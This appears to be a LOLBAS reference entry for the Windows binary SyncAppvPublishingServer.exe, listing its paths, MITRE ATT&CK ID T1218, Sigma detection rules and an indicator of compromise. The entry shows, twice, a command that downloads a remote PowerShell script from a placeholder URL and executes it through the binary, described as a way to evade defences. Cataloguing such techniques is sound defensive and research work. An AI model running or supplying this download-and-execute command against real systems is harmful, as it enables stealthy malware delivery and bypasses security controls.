---
Acknowledgement:
- Person: Nick Land
Author: Oddvar Moe
Commands:
- Category: Execute
  Command: SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}')
    | IEX"
  Description: Example command on how inject Powershell code into the process
  MitreID: T1218
  OperatingSystem: Windows 10 1709, Windows 10 1703, Windows 10 1607
  Privileges: User
  Tags:
  - Execute: PowerShell
  Usecase: Use SyncAppvPublishingServer as a Powershell host to execute Powershell
    code. Evade defensive counter measures
Created: 2018-05-25
Description: Used by App-v to get App-v server lists
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/powershell/powershell_script/posh_ps_syncappvpublishingserver_exe.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/powershell/powershell_module/posh_pm_syncappvpublishingserver_exe.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_syncappvpublishingserver_execute_psh.yml
- IOC: SyncAppvPublishingServer.exe should never be in use unless App-V is deployed
Full_Path:
- Path: C:\Windows\System32\SyncAppvPublishingServer.exe
- Path: C:\Windows\SysWOW64\SyncAppvPublishingServer.exe
Name: SyncAppvPublishingServer.exe
Resources:
- Link: https://twitter.com/monoxgas/status/895045566090010624
mitre_data:
  technique_ids:
  - T1218
tags:
- lolbas/osbinaries
---

# SyncAppvPublishingServer.exe

Used by App-v to get App-v server lists

# Path(s)

- `C:\Windows\System32\SyncAppvPublishingServer.exe`
- `C:\Windows\SysWOW64\SyncAppvPublishingServer.exe`

# Execute Commands

Example command on how inject Powershell code into the process

```batch
SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX"
```

- **Usecase:** Use SyncAppvPublishingServer as a Powershell host to execute Powershell code. Evade defensive counter measures
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows 10 1709, Windows 10 1703, Windows 10 1607



# Resource(s)

- https://twitter.com/monoxgas/status/895045566090010624
# Acknowledgements

- Oddvar Moe (Authored, 2018-05-25)
- Nick Land